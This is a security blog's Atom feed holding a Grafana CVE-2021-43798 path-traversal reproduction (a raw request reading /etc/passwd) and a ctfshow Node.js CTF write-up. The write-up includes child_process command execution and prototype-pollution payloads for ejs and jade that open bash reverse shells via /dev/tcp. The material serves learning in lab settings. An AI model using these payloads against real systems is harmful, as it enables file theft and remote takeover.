<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>1__/\/のblog</title>
  
  <subtitle>LN</subtitle>
  <link href="http://lll-nnn.github.io/atom.xml" rel="self"/>
  
  <link href="http://lll-nnn.github.io/"/>
  <updated>2022-04-18T15:06:36.414Z</updated>
  <id>http://lll-nnn.github.io/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Grafana_cve</title>
    <link href="http://lll-nnn.github.io/2022/04/18/grafana-cve/"/>
    <id>http://lll-nnn.github.io/2022/04/18/grafana-cve/</id>
    <published>2022-04-18T14:51:07.000Z</published>
    <updated>2022-04-18T15:06:36.414Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Grafana-8-x任意文件读取"><a href="#Grafana-8-x任意文件读取" class="headerlink" title="Grafana 8.x任意文件读取"></a>Grafana 8.x任意文件读取</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798">CVE-2021-43798</a></p><blockquote><p>Grafana 是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana 可以在网络浏览器里显示数据图表和警告。</p></blockquote><p><a href="https://github.com/vulhub/vulhub/blob/master/grafana/CVE-2021-43798/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/grafana/CVE-2021-43798/README.zh-cn.md</a></p><blockquote><p>该漏洞是由插件模块引起的，模块能够提供插件文件夹内的静态文件。攻击者可以使用 <code>../</code>从插件文件夹到父文件夹并下载任意文件。</p></blockquote><p>影响版本：<code>Grafana 8.0.0-beta1 to 8.3.0</code></p><p><code>sudo docker-compose up -d</code></p><p><code>http://ip:3000/</code></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204182257149.png"></p><p>抓包验证</p><pre class="language-txt" data-language="txt"><code class="language-txt">GET &#x2F;public&#x2F;plugins&#x2F;cloudwatch&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1Host: 192.168.17.131:3000Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;100.0.4896.127 Safari&#x2F;537.36 Edg&#x2F;100.0.1185.44Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8,en-GB;q&#x3D;0.7,en-US;q&#x3D;0.6Cookie: grafana_session&#x3D;bc1590ee5ecb32b0207a12ae4729b331; redirect_to&#x3D;%2FConnection: close</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204182304180.png"></p><p>其他插件</p><pre class="language-txt" data-language="txt"><code class="language-txt">alertlistcloudwatchdashlistelasticsearchgraphgraphiteheatmapinfluxdbmysqlopentsdbpluginlistpostgresprometheusstackdrivertabletext</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Grafana-8-x任意文件读取&quot;&gt;&lt;a href=&quot;#Grafana-8-x任意文件读取&quot; class=&quot;headerlink&quot; title=&quot;Grafana 8.x任意文件读取&quot;&gt;&lt;/a&gt;Grafana 8.x任意文件读取&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;h</summary>
      
    
    
    
    <category term="CVE" scheme="http://lll-nnn.github.io/categories/CVE/"/>
    
    
    <category term="Grafana任意文件读取" scheme="http://lll-nnn.github.io/tags/Grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>Ctfshow-Nodejs</title>
    <link href="http://lll-nnn.github.io/2022/04/18/ctfshow-nodejs/"/>
    <id>http://lll-nnn.github.io/2022/04/18/ctfshow-nodejs/</id>
    <published>2022-04-18T09:19:08.000Z</published>
    <updated>2022-04-18T14:47:47.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p>给了两个js文件</p><p><code>login.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> users <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../modules/user'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">;</span> <span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token function">findUser</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">regenerate</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>ret_code<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> ret_msg<span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>             req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>loginUser <span class="token operator">=</span> user<span class="token punctuation">.</span>username<span class="token punctuation">;</span>      res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>ret_code<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> ret_msg<span class="token operator">:</span> <span class="token string">'登录成功'</span><span class="token punctuation">,</span>ret_flag<span class="token operator">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>ret_code<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> ret_msg<span class="token operator">:</span> <span class="token string">'账号或密码错误'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p><code>user.js</code></p><pre class="language-js" data-language="js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  items<span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">&#123;</span>username<span class="token operator">:</span> <span class="token string">'CTFSHOW'</span><span class="token punctuation">,</span> password<span class="token operator">:</span> <span class="token string">'123456'</span><span class="token punctuation">&#125;</span>  <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>传入<code>username=CTFShOW,password=123456</code></p><h2 id="web335-336"><a href="#web335-336" class="headerlink" title="web335-336"></a>web335-336</h2><p>js命令执行</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execFileSync</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">'cat'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'fl001g.txt'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> msg<span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>payload:<code>?a[a]=1&amp;b[b]=2</code></p><p>即<code>a=&#123;a:1&#125;        b=&#123;b:2&#125;</code></p><p><code>a+flag=[object Object]ctfshow&#123;xxxxxx&#125;</code></p><p><code>b+flag=[object Object]ctfshow&#123;xxxxxx&#125;</code></p><p>md5后的值相等</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204181752940.png"></p><h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>原型链污染</p><p><code>login.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>ret_code<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> ret_msg<span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p><code>copy函数</code></p><pre class="language-js" data-language="js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  copy<span class="token operator">:</span>copy<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">copy</span><span class="token punctuation">(</span><span class="token parameter">object1<span class="token punctuation">,</span> object2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> object2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> object2 <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> object1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">copy</span><span class="token punctuation">(</span>object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            object1<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> object2<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span></code></pre><p>secert原来是<code>&#123;&#125;</code>,需要有一个属性<code>ctfshow</code>，值为<code>36dboy</code></p><p>user也是<code>&#123;&#125;</code>，通过<code>__proto__</code>给<code>&#123;&#125;</code>添加属性</p><p>payload:<code>&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;,&quot;password&quot;:&quot;123&quot;&#125;</code></p><p>password不必要，没用</p><h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><p>相比上一题<code>login.js</code>变成了</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204181913607.png"></p><p>无法直接利用了</p><p>多了<code>api.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> query<span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p><code>query</code>没定义，会到<code>Object</code>找，所以污染<code>Object</code>加个<code>query</code>属性执行命令</p><p>payload：</p><p><code>&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/xxxx 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></p><h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><p>相比上一题user改成了对象</p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204182138018.png"></p><p>所以需要两层才能污染<code>&#123;&#125;</code>添加<code>query</code>属性</p><p>payload:</p><p><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xx/xx 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></p><h2 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h2><p><code>ejs模板引擎</code>原型链RCE</p><p><a href="https://www.anquanke.com/post/id/236354">关于nodejs的ejs和jade模板引擎的原型链污染挖掘</a></p><p>payload:<code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2233 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;&#125;</code></p><p><code>/login</code>提交后访问任何页面即可触发</p><h2 id="web342-343"><a href="#web342-343" class="headerlink" title="web342-343"></a>web342-343</h2><p><code>jade模板引擎</code>原型链RCE</p><p><a href="https://xz.aliyun.com/t/7025#toc-2">再探 JavaScript 原型链污染到 RCE</a></p><p>payload:<code>&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2233 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></p><h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><pre class="language-js" data-language="js"><code class="language-js">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">8c|2c|\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>name<span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>password<span class="token operator">===</span><span class="token string">'ctfshow'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>isVIP<span class="token operator">===</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag. :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>GET</code></p><p>过滤了逗号和<code>8c</code>、<code>2c</code></p><p>payload:<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p><p>nodejs会将这三部分拼接，<code>c</code>编码是因为<code>&quot;</code>的url是<code>%22</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;web334&quot;&gt;&lt;a href=&quot;#web334&quot; class=&quot;headerlink&quot; title=&quot;web334&quot;&gt;&lt;/a&gt;web334&lt;/h2&gt;&lt;p&gt;给了两个js文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;login.js&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    
    <category term="nodejs" scheme="http://lll-nnn.github.io/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Php特性</title>
    <link href="http://lll-nnn.github.io/2022/04/17/php%E7%89%B9%E6%80%A7/"/>
    <id>http://lll-nnn.github.io/2022/04/17/php%E7%89%B9%E6%80%A7/</id>
    <published>2022-04-17T15:46:18.000Z</published>
    <updated>2022-04-17T15:57:43.117Z</updated>
    
